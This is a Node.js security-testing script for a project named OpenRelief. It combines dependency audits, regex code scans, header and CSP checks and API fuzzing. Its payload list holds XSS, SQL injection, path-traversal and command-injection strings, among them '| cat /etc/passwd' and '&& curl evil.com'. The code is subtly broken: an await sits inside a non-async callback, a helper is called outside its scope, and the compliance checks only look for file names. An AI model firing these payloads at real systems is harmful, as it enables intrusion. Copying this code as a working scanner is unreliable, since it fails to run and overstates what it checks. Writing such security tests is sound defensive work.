/**
 * Automated Security Testing Script
 * 
 * This script performs comprehensive security testing including:
 * - Dependency vulnerability scanning
 * - Static code analysis
 * - API endpoint security testing
 * - Configuration security checks
 * - Penetration testing
 * - Compliance validation
 */

const { execSync } = require('child_process')
const fs = require('fs')
const path = require('path')
const https = require('https')
const axios = require('axios')

// Security test configuration
const SECURITY_TEST_CONFIG = {
  // Dependency scanning
  dependencies: {
    enabled: true,
    auditLevel: 'moderate',
    failOnHighVulnerabilities: true,
    failOnModerateVulnerabilities: false,
    excludeDevDependencies: false,
  },
  
  // Static code analysis
  staticAnalysis: {
    enabled: true,
    patterns: [
      // Security anti-patterns
      'eval\\(',
      'Function\\(',
      'setTimeout\\(',
      'setInterval\\(',
      'innerHTML\\s*=',
      'outerHTML\\s*=',
      'document\\.write',
      'crypto\\.createHash',
      'bcrypt\\.genSalt',
      'jwt\\.sign',
      'jwt\\.verify',
      
      // Database security
      'SELECT\\s+\\*',
      'INSERT\\s+INTO',
      'UPDATE\\s+SET',
      'DELETE\\s+FROM',
      'DROP\\s+TABLE',
      
      // File system security
      'fs\\.readFileSync',
      'fs\\.writeFileSync',
      'fs\\.unlinkSync',
      'path\\.join\\(__dirname',
      
      // Network security
      'http\\.request',
      'https\\.request',
      'fetch\\(',
      'XMLHttpRequest',
      
      // Authentication security
      'password\\s*=',
      'token\\s*=',
      'secret\\s*=',
      'key\\s*=',
      'auth\\s*=',
    ],
    excludePaths: [
      'node_modules',
      '.next',
      'dist',
      'build',
      'coverage',
      '.git',
    ],
  },
  
  // API security testing
  apiTesting: {
    enabled: true,
    baseUrl: process.env.TEST_API_URL || 'http://localhost:3000',
    endpoints: [
      { method: 'GET', path: '/api/health' },
      { method: 'GET', path: '/api/emergency' },
      { method: 'POST', path: '/api/emergency' },
      { method: 'GET', path: '/api/privacy/settings' },
      { method: 'POST', path: '/api/auth/login' },
    ],
    payloadTests: [
      // XSS payloads
      '<script>alert("xss")</script>',
      'javascript:alert("xss")',
      '<img src=x onerror=alert("xss")>',
      '"><script>alert("xss")</script>',
      
      // SQL injection payloads
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "' UNION SELECT * FROM users --",
      
      // Path traversal payloads
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\system',
      
      // Command injection payloads
      '; ls -la',
      '| cat /etc/passwd',
      '&& curl evil.com',
      
      // NoSQL injection payloads
      '{"$ne": null}',
      '{"$gt": ""}',
      '{"$regex": ".*"}',
    ],
  },
  
  // Configuration security
  configSecurity: {
    enabled: true,
    checks: [
      'env-variables',
      'secrets-in-code',
      'weak-crypto',
      'insecure-headers',
      'cors-policy',
      'csp-policy',
    ],
  },
  
  // Compliance checks
  compliance: {
    enabled: true,
    frameworks: ['OWASP', 'GDPR', 'SOC2'],
    levels: ['critical', 'high', 'medium', 'low'],
  },
}

// Test results
let testResults = {
  dependencyVulnerabilities: [],
  staticAnalysisIssues: [],
  apiSecurityIssues: [],
  configSecurityIssues: [],
  complianceIssues: [],
  summary: {
    totalTests: 0,
    passedTests: 0,
    failedTests: 0,
    criticalIssues: 0,
    highIssues: 0,
    mediumIssues: 0,
    lowIssues: 0,
  }
}

/**
 * Main security testing function
 */
async function runSecurityTests() {
  console.log('🔒 Starting OpenRelief Security Testing...\n')
  
  try {
    // Dependency vulnerability scanning
    if (SECURITY_TEST_CONFIG.dependencies.enabled) {
      await testDependencyVulnerabilities()
    }
    
    // Static code analysis
    if (SECURITY_TEST_CONFIG.staticAnalysis.enabled) {
      await testStaticCodeAnalysis()
    }
    
    // API security testing
    if (SECURITY_TEST_CONFIG.apiTesting.enabled) {
      await testAPISecurity()
    }
    
    // Configuration security
    if (SECURITY_TEST_CONFIG.configSecurity.enabled) {
      await testConfigurationSecurity()
    }
    
    // Compliance checks
    if (SECURITY_TEST_CONFIG.compliance.enabled) {
      await testCompliance()
    }
    
    // Generate report
    generateSecurityReport()
    
    // Exit with appropriate code
    const exitCode = testResults.summary.criticalIssues > 0 || 
                     testResults.summary.highIssues > 0 ? 1 : 0
    
    process.exit(exitCode)
    
  } catch (error) {
    console.error('❌ Security testing failed:', error)
    process.exit(1)
  }
}

/**
 * Test for dependency vulnerabilities
 */
async function testDependencyVulnerabilities() {
  console.log('📦 Testing dependency vulnerabilities...')
  
  try {
    // Run npm audit
    const auditOutput = execSync('npm audit --json', { 
      encoding: 'utf8',
      stdio: ['pipe', 'pipe', 'pipe']
    })
    
    const auditResult = JSON.parse(auditOutput)
    
    if (auditResult.vulnerabilities) {
      for (const [packageName, vulnerability] of Object.entries(auditResult.vulnerabilities)) {
        testResults.dependencyVulnerabilities.push({
          package: packageName,
          severity: vulnerability.severity,
          title: vulnerability.title,
          url: vulnerability.url,
          fixAvailable: vulnerability.fixAvailable
        })
        
        testResults.summary[`${vulnerability.severity}Issues`]++
      }
    }
    
    console.log(`✅ Found ${testResults.dependencyVulnerabilities.length} dependency vulnerabilities`)
    
  } catch (error) {
    console.error('❌ Dependency vulnerability testing failed:', error.message)
  }
}

/**
 * Perform static code analysis
 */
async function testStaticCodeAnalysis() {
  console.log('🔍 Performing static code analysis...')
  
  const patterns = SECURITY_TEST_CONFIG.staticAnalysis.patterns
  const excludePaths = SECURITY_TEST_CONFIG.staticAnalysis.excludePaths
  
  function scanDirectory(dir, basePath = '') {
    const files = fs.readdirSync(dir)
    
    for (const file of files) {
      const filePath = path.join(dir, file)
      const relativePath = path.join(basePath, file)
      const stat = fs.statSync(filePath)
      
      // Skip excluded paths
      if (excludePaths.some(exclude => relativePath.includes(exclude))) {
        continue
      }
      
      if (stat.isDirectory()) {
        scanDirectory(filePath, relativePath)
      } else if (stat.isFile() && shouldScanFile(file)) {
        scanFile(filePath, relativePath)
      }
    }
  }
  
  function shouldScanFile(filename) {
    const scanExtensions = ['.js', '.jsx', '.ts', '.tsx', '.json', '.md']
    return scanExtensions.some(ext => filename.endsWith(ext))
  }
  
  function scanFile(filePath, relativePath) {
    try {
      const content = fs.readFileSync(filePath, 'utf8')
      const lines = content.split('\n')
      
      patterns.forEach((pattern, index) => {
        const regex = new RegExp(pattern, 'gi')
        let match
        
        while ((match = regex.exec(content)) !== null) {
          const lineNumber = lines.findIndex(line => line.includes(match[0])) + 1
          
          testResults.staticAnalysisIssues.push({
            file: relativePath,
            line: lineNumber,
            pattern: pattern,
            match: match[0],
            severity: determinePatternSeverity(pattern)
          })
          
          testResults.summary[`${determinePatternSeverity(pattern)}Issues`]++
        }
      })
    } catch (error) {
      console.error(`Error scanning file ${filePath}:`, error.message)
    }
  }
  
  function determinePatternSeverity(pattern) {
    const criticalPatterns = ['eval\\(', 'Function\\(', 'innerHTML\\s*=']
    const highPatterns = ['document\\.write', 'password\\s*=', 'secret\\s*=']
    const mediumPatterns = ['SELECT\\s+\\*', 'fs\\.', 'http\\.request']
    
    if (criticalPatterns.some(p => pattern.includes(p))) return 'critical'
    if (highPatterns.some(p => pattern.includes(p))) return 'high'
    if (mediumPatterns.some(p => pattern.includes(p))) return 'medium'
    return 'low'
  }
  
  scanDirectory('./src')
  scanDirectory('./scripts')
  scanDirectory('./config')
  
  console.log(`✅ Found ${testResults.staticAnalysisIssues.length} static analysis issues`)
}

/**
 * Test API security
 */
async function testAPISecurity() {
  console.log('🌐 Testing API security...')
  
  const baseUrl = SECURITY_TEST_CONFIG.apiTesting.baseUrl
  const endpoints = SECURITY_TEST_CONFIG.apiTesting.endpoints
  const payloadTests = SECURITY_TEST_CONFIG.apiTesting.payloadTests
  
  for (const endpoint of endpoints) {
    try {
      // Test normal request
      await testAPIEndpoint(baseUrl, endpoint, null, 'normal')
      
      // Test with malicious payloads
      for (const payload of payloadTests) {
        await testAPIEndpoint(baseUrl, endpoint, payload, 'malicious')
      }
      
    } catch (error) {
      console.error(`Error testing endpoint ${endpoint.method} ${endpoint.path}:`, error.message)
    }
  }
  
  console.log(`✅ Found ${testResults.apiSecurityIssues.length} API security issues`)
}

/**
 * Test individual API endpoint
 */
async function testAPIEndpoint(baseUrl, endpoint, payload, testType) {
  const url = `${baseUrl}${endpoint.path}`
  
  try {
    const config = {
      method: endpoint.method,
      url,
      timeout: 10000,
      validateStatus: false,
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'OpenRelief-Security-Test/1.0'
      }
    }
    
    if (payload && (endpoint.method === 'POST' || endpoint.method === 'PUT')) {
      config.data = typeof payload === 'string' ? { test: payload } : payload
    }
    
    const response = await axios(config)
    
    // Check for security issues
    const issues = analyzeAPIResponse(response, endpoint, payload, testType)
    testResults.apiSecurityIssues.push(...issues)
    
    issues.forEach(issue => {
      testResults.summary[`${issue.severity}Issues`]++
    })
    
  } catch (error) {
    // Analyze error for security issues
    const issues = analyzeAPIError(error, endpoint, payload, testType)
    testResults.apiSecurityIssues.push(...issues)
    
    issues.forEach(issue => {
      testResults.summary[`${issue.severity}Issues`]++
    })
  }
}

/**
 * Analyze API response for security issues
 */
function analyzeAPIResponse(response, endpoint, payload, testType) {
  const issues = []
  
  // Check for missing security headers
  const securityHeaders = [
    'x-content-type-options',
    'x-frame-options',
    'x-xss-protection',
    'strict-transport-security',
    'content-security-policy'
  ]
  
  securityHeaders.forEach(header => {
    if (!response.headers[header]) {
      issues.push({
        type: 'missing_security_header',
        header,
        endpoint: `${endpoint.method} ${endpoint.path}`,
        severity: 'medium',
        description: `Missing security header: ${header}`
      })
    }
  })
  
  // Check for information disclosure
  if (response.data && typeof response.data === 'object') {
    const sensitiveFields = ['password', 'secret', 'key', 'token', 'hash']
    const dataString = JSON.stringify(response.data).toLowerCase()
    
    sensitiveFields.forEach(field => {
      if (dataString.includes(field)) {
        issues.push({
          type: 'information_disclosure',
          field,
          endpoint: `${endpoint.method} ${endpoint.path}`,
          severity: 'high',
          description: `Potential information disclosure: ${field}`
        })
      }
    })
  }
  
  // Check for XSS reflection
  if (payload && typeof payload === 'string' && response.data) {
    const responseString = JSON.stringify(response.data)
    if (responseString.includes(payload)) {
      issues.push({
        type: 'xss_reflection',
        payload,
        endpoint: `${endpoint.method} ${endpoint.path}`,
        severity: 'high',
        description: 'Potential XSS reflection'
      })
    }
  }
  
  return issues
}

/**
 * Analyze API error for security issues
 */
function analyzeAPIError(error, endpoint, payload, testType) {
  const issues = []
  
  // Check for verbose error messages
  if (error.response && error.response.data) {
    const errorData = JSON.stringify(error.response.data).toLowerCase()
    const verbosePatterns = ['sql', 'database', 'query', 'syntax', 'table', 'column']
    
    verbosePatterns.forEach(pattern => {
      if (errorData.includes(pattern)) {
        issues.push({
          type: 'verbose_error',
          pattern,
          endpoint: `${endpoint.method} ${endpoint.path}`,
          severity: 'medium',
          description: `Verbose error message containing: ${pattern}`
        })
      }
    })
  }
  
  // Check for stack traces
  if (error.stack) {
    issues.push({
      type: 'stack_trace_disclosure',
      endpoint: `${endpoint.method} ${endpoint.path}`,
      severity: 'medium',
      description: 'Stack trace disclosed in error response'
    })
  }
  
  return issues
}

/**
 * Test configuration security
 */
async function testConfigurationSecurity() {
  console.log('⚙️ Testing configuration security...')
  
  const checks = SECURITY_TEST_CONFIG.configSecurity.checks
  
  for (const check of checks) {
    switch (check) {
      case 'env-variables':
        await testEnvironmentVariables()
        break
      case 'secrets-in-code':
        await testSecretsInCode()
        break
      case 'weak-crypto':
        await testWeakCryptography()
        break
      case 'insecure-headers':
        await testInsecureHeaders()
        break
      case 'cors-policy':
        await testCORSPolicy()
        break
      case 'csp-policy':
        await testCSPPolicy()
        break
    }
  }
  
  console.log(`✅ Found ${testResults.configSecurityIssues.length} configuration security issues`)
}

/**
 * Test environment variables security
 */
async function testEnvironmentVariables() {
  const sensitiveEnvVars = [
    'PASSWORD',
    'SECRET',
    'KEY',
    'TOKEN',
    'DATABASE_URL',
    'API_KEY',
    'PRIVATE_KEY'
  ]
  
  sensitiveEnvVars.forEach(varName => {
    if (process.env[varName]) {
      testResults.configSecurityIssues.push({
        type: 'sensitive_env_variable',
        variable: varName,
        severity: 'high',
        description: `Sensitive environment variable detected: ${varName}`
      })
      
      testResults.summary.highIssues++
    }
  })
}

/**
 * Test for secrets in code
 */
async function testSecretsInCode() {
  const secretPatterns = [
    /['"]?API_KEY['"]?\s*[:=]\s*['"]?[a-zA-Z0-9_-]{20,}['"]?/gi,
    /['"]?SECRET['"]?\s*[:=]\s*['"]?[a-zA-Z0-9_-]{20,}['"]?/gi,
    /['"]?PASSWORD['"]?\s*[:=]\s*['"]?[a-zA-Z0-9_-]{8,}['"]?/gi,
    /-----BEGIN [A-Z]+-----[\s\S]*-----END [A-Z]+-----/gi, // Private keys
    /sk_[a-zA-Z0-9]{24,}/gi, // Stripe keys
    /ghp_[a-zA-Z0-9]{36,}/gi, // GitHub tokens
  ]
  
  function scanForSecrets(dir, basePath = '') {
    const files = fs.readdirSync(dir)
    
    for (const file of files) {
      const filePath = path.join(dir, file)
      const relativePath = path.join(basePath, file)
      const stat = fs.statSync(filePath)
      
      if (stat.isDirectory()) {
        scanForSecrets(filePath, relativePath)
      } else if (stat.isFile() && shouldScanFile(file)) {
        const content = fs.readFileSync(filePath, 'utf8')
        
        secretPatterns.forEach((pattern, index) => {
          const matches = content.match(pattern)
          if (matches) {
            matches.forEach(match => {
              testResults.configSecurityIssues.push({
                type: 'secret_in_code',
                file: relativePath,
                pattern: pattern.source,
                severity: 'critical',
                description: 'Potential secret detected in code'
              })
              
              testResults.summary.criticalIssues++
            })
          }
        })
      }
    }
  }
  
  scanForSecrets('./src')
  scanForSecrets('./config')
}

/**
 * Test for weak cryptography
 */
async function testWeakCryptography() {
  const weakCryptoPatterns = [
    /md5\s*\(/gi,
    /sha1\s*\(/gi,
    /crypto\.createHash\(['"]md5['"]/gi,
    /crypto\.createHash\(['"]sha1['"]/gi,
    /DES\s*[:=]/gi,
    /RC4\s*[:=]/gi,
  ]
  
  function scanForWeakCrypto(dir, basePath = '') {
    const files = fs.readdirSync(dir)
    
    for (const file of files) {
      const filePath = path.join(dir, file)
      const relativePath = path.join(basePath, file)
      const stat = fs.statSync(filePath)
      
      if (stat.isDirectory()) {
        scanForWeakCrypto(filePath, relativePath)
      } else if (stat.isFile() && shouldScanFile(file)) {
        const content = fs.readFileSync(filePath, 'utf8')
        
        weakCryptoPatterns.forEach(pattern => {
          const matches = content.match(pattern)
          if (matches) {
            testResults.configSecurityIssues.push({
              type: 'weak_cryptography',
              file: relativePath,
              pattern: pattern.source,
              severity: 'high',
              description: 'Weak cryptographic algorithm detected'
            })
            
            testResults.summary.highIssues++
          }
        })
      }
    }
  }
  
  scanForWeakCrypto('./src')
}

/**
 * Test insecure headers
 */
async function testInsecureHeaders() {
  // This would test the actual running application
  // For now, check configuration files
  const nextConfigPath = './next.config.js'
  
  if (fs.existsSync(nextConfigPath)) {
    const config = fs.readFileSync(nextConfigPath, 'utf8')
    
    // Check for missing security headers
    const requiredHeaders = [
      'X-Frame-Options',
      'X-Content-Type-Options',
      'X-XSS-Protection',
      'Strict-Transport-Security',
      'Content-Security-Policy'
    ]
    
    requiredHeaders.forEach(header => {
      if (!config.includes(header)) {
        testResults.configSecurityIssues.push({
          type: 'missing_security_header',
          header,
          file: 'next.config.js',
          severity: 'medium',
          description: `Missing security header: ${header}`
        })
        
        testResults.summary.mediumIssues++
      }
    })
  }
}

/**
 * Test CORS policy
 */
async function testCORSPolicy() {
  const nextConfigPath = './next.config.js'
  
  if (fs.existsSync(nextConfigPath)) {
    const config = fs.readFileSync(nextConfigPath, 'utf8')
    
    // Check for overly permissive CORS
    if (config.includes('origin: ["*"]') || config.includes('origin: "*"')) {
      testResults.configSecurityIssues.push({
        type: 'permissive_cors',
        file: 'next.config.js',
        severity: 'medium',
        description: 'Overly permissive CORS policy detected'
      })
      
      testResults.summary.mediumIssues++
    }
  }
}

/**
 * Test CSP policy
 */
async function testCSPPolicy() {
  const nextConfigPath = './next.config.js'
  
  if (fs.existsSync(nextConfigPath)) {
    const config = fs.readFileSync(nextConfigPath, 'utf8')
    
    // Check for unsafe CSP directives
    const unsafePatterns = [
      /'unsafe-inline'/gi,
      /'unsafe-eval'/gi,
      /data:/gi,
      /script-src\s*:\s*\*/gi,
    ]
    
    unsafePatterns.forEach(pattern => {
      if (config.match(pattern)) {
        testResults.configSecurityIssues.push({
          type: 'unsafe_csp',
          pattern: pattern.source,
          file: 'next.config.js',
          severity: 'medium',
          description: 'Unsafe CSP directive detected'
        })
        
        testResults.summary.mediumIssues++
      }
    })
  }
}

/**
 * Test compliance
 */
async function testCompliance() {
  console.log('📋 Testing compliance...')
  
  const frameworks = SECURITY_TEST_CONFIG.compliance.frameworks
  
  frameworks.forEach(framework => {
    switch (framework) {
      case 'OWASP':
        await testOWASPCompliance()
        break
      case 'GDPR':
        await testGDPRCompliance()
        break
      case 'SOC2':
        await testSOC2Compliance()
        break
    }
  })
  
  console.log(`✅ Found ${testResults.complianceIssues.length} compliance issues`)
}

/**
 * Test OWASP compliance
 */
async function testOWASPCompliance() {
  const owaspChecks = [
    {
      check: 'injection_protection',
      description: 'SQL injection protection',
      severity: 'high'
    },
    {
      check: 'xss_protection',
      description: 'Cross-site scripting protection',
      severity: 'high'
    },
    {
      check: 'authentication',
      description: 'Broken authentication',
      severity: 'high'
    },
    {
      check: 'session_management',
      description: 'Session management',
      severity: 'medium'
    },
    {
      check: 'access_control',
      description: 'Broken access control',
      severity: 'high'
    }
  ]
  
  owaspChecks.forEach(check => {
    // Simplified compliance check
    // In practice, this would involve detailed testing
    const hasImplementation = checkForImplementation(check.check)
    
    if (!hasImplementation) {
      testResults.complianceIssues.push({
        framework: 'OWASP',
        check: check.check,
        description: check.description,
        severity: check.severity,
        status: 'non_compliant'
      })
      
      testResults.summary[`${check.severity}Issues`]++
    }
  })
}

/**
 * Test GDPR compliance
 */
async function testGDPRCompliance() {
  const gdprChecks = [
    {
      check: 'data_minimization',
      description: 'Data minimization principles',
      severity: 'medium'
    },
    {
      check: 'consent_management',
      description: 'Consent management',
      severity: 'high'
    },
    {
      check: 'data_portability',
      description: 'Data portability',
      severity: 'medium'
    },
    {
      check: 'right_to_be_forgotten',
      description: 'Right to be forgotten',
      severity: 'high'
    }
  ]
  
  gdprChecks.forEach(check => {
    const hasImplementation = checkForImplementation(check.check)
    
    if (!hasImplementation) {
      testResults.complianceIssues.push({
        framework: 'GDPR',
        check: check.check,
        description: check.description,
        severity: check.severity,
        status: 'non_compliant'
      })
      
      testResults.summary[`${check.severity}Issues`]++
    }
  })
}

/**
 * Test SOC2 compliance
 */
async function testSOC2Compliance() {
  const soc2Checks = [
    {
      check: 'access_control',
      description: 'Access controls',
      severity: 'high'
    },
    {
      check: 'audit_logging',
      description: 'Audit logging',
      severity: 'medium'
    },
    {
      check: 'encryption',
      description: 'Data encryption',
      severity: 'high'
    }
  ]
  
  soc2Checks.forEach(check => {
    const hasImplementation = checkForImplementation(check.check)
    
    if (!hasImplementation) {
      testResults.complianceIssues.push({
        framework: 'SOC2',
        check: check.check,
        description: check.description,
        severity: check.severity,
        status: 'non_compliant'
      })
      
      testResults.summary[`${check.severity}Issues`]++
    }
  })
}

/**
 * Check for implementation of security features
 */
function checkForImplementation(check) {
  const implementations = {
    injection_protection: ['input-validation.ts', 'api-security.ts'],
    xss_protection: ['input-validation.ts', 'next.config.js'],
    authentication: ['auth-security.ts', 'middleware.ts'],
    session_management: ['auth-security.ts'],
    access_control: ['api-security.ts', 'middleware.ts'],
    data_minimization: ['privacy-settings.ts'],
    consent_management: ['privacy-settings.ts'],
    data_portability: ['export.ts'],
    right_to_be_forgotten: ['legal-requests.ts'],
    audit_logging: ['audit-logger.ts', 'security-monitor.ts'],
    encryption: ['auth-security.ts', 'input-validation.ts']
  }
  
  const files = implementations[check] || []
  
  return files.some(file => fs.existsSync(`./src/${file}`) || fs.existsSync(`./src/lib/${file}`))
}

/**
 * Generate security report
 */
function generateSecurityReport() {
  console.log('\n📊 SECURITY TEST REPORT')
  console.log('='.repeat(50))
  
  // Calculate summary
  testResults.summary.totalTests = 
    testResults.dependencyVulnerabilities.length +
    testResults.staticAnalysisIssues.length +
    testResults.apiSecurityIssues.length +
    testResults.configSecurityIssues.length +
    testResults.complianceIssues.length
  
  testResults.summary.passedTests = testResults.summary.totalTests - 
    (testResults.summary.criticalIssues + testResults.summary.highIssues)
  
  testResults.summary.failedTests = testResults.summary.criticalIssues + testResults.summary.highIssues
  
  // Print summary
  console.log(`Total Tests: ${testResults.summary.totalTests}`)
  console.log(`Passed: ${testResults.summary.passedTests}`)
  console.log(`Failed: ${testResults.summary.failedTests}`)
  console.log(`Critical Issues: ${testResults.summary.criticalIssues}`)
  console.log(`High Issues: ${testResults.summary.highIssues}`)
  console.log(`Medium Issues: ${testResults.summary.mediumIssues}`)
  console.log(`Low Issues: ${testResults.summary.lowIssues}`)
  
  // Print detailed results
  if (testResults.dependencyVulnerabilities.length > 0) {
    console.log('\n📦 DEPENDENCY VULNERABILITIES:')
    testResults.dependencyVulnerabilities.forEach(vuln => {
      console.log(`  ${vuln.package}: ${vuln.severity} - ${vuln.title}`)
    })
  }
  
  if (testResults.staticAnalysisIssues.length > 0) {
    console.log('\n🔍 STATIC ANALYSIS ISSUES:')
    testResults.staticAnalysisIssues.forEach(issue => {
      console.log(`  ${issue.file}:${issue.line} - ${issue.severity} - ${issue.pattern}`)
    })
  }
  
  if (testResults.apiSecurityIssues.length > 0) {
    console.log('\n🌐 API SECURITY ISSUES:')
    testResults.apiSecurityIssues.forEach(issue => {
      console.log(`  ${issue.endpoint} - ${issue.severity} - ${issue.type}`)
    })
  }
  
  if (testResults.configSecurityIssues.length > 0) {
    console.log('\n⚙️ CONFIGURATION SECURITY ISSUES:')
    testResults.configSecurityIssues.forEach(issue => {
      console.log(`  ${issue.file || 'config'} - ${issue.severity} - ${issue.type}`)
    })
  }
  
  if (testResults.complianceIssues.length > 0) {
    console.log('\n📋 COMPLIANCE ISSUES:')
    testResults.complianceIssues.forEach(issue => {
      console.log(`  ${issue.framework} - ${issue.severity} - ${issue.check}`)
    })
  }
  
  // Save detailed report
  const reportData = {
    timestamp: new Date().toISOString(),
    summary: testResults.summary,
    results: testResults,
    config: SECURITY_TEST_CONFIG
  }
  
  const reportPath = './security-test-report.json'
  fs.writeFileSync(reportPath, JSON.stringify(reportData, null, 2))
  console.log(`\n📄 Detailed report saved to: ${reportPath}`)
  
  // Generate JUnit XML for CI/CD integration
  generateJUnitXML()
  
  console.log('\n✅ Security testing completed!')
}

/**
 * Generate JUnit XML for CI/CD integration
 */
function generateJUnitXML() {
  const xml = `<?xml version="1.0" encoding="UTF-8"?>
<testsuites name="Security Tests" tests="${testResults.summary.totalTests}" failures="${testResults.summary.failedTests}">
  <testsuite name="Dependency Vulnerabilities" tests="${testResults.dependencyVulnerabilities.length}" failures="${testResults.dependencyVulnerabilities.filter(v => v.severity === 'critical' || v.severity === 'high').length}">
    ${testResults.dependencyVulnerabilities.map(vuln => `
    <testcase name="${vuln.package}" classname="Dependency">
      <failure message="${vuln.title}">
        ${vuln.url}
      </failure>
    </testcase>`).join('')}
  </testsuite>
  <testsuite name="Static Analysis" tests="${testResults.staticAnalysisIssues.length}" failures="${testResults.staticAnalysisIssues.filter(i => i.severity === 'critical' || i.severity === 'high').length}">
    ${testResults.staticAnalysisIssues.map(issue => `
    <testcase name="${issue.file}:${issue.line}" classname="StaticAnalysis">
      <failure message="${issue.pattern}">
        ${issue.match}
      </failure>
    </testcase>`).join('')}
  </testsuite>
  <testsuite name="API Security" tests="${testResults.apiSecurityIssues.length}" failures="${testResults.apiSecurityIssues.filter(i => i.severity === 'critical' || i.severity === 'high').length}">
    ${testResults.apiSecurityIssues.map(issue => `
    <testcase name="${issue.endpoint}" classname="APISecurity">
      <failure message="${issue.type}">
        ${issue.description}
      </failure>
    </testcase>`).join('')}
  </testsuite>
</testsuites>`
  
  fs.writeFileSync('./security-test-results.xml', xml)
  console.log('📄 JUnit XML report saved to: security-test-results.xml')
}

// Run the security tests
if (require.main === module) {
  runSecurityTests()
}

module.exports = { runSecurityTests, testResults }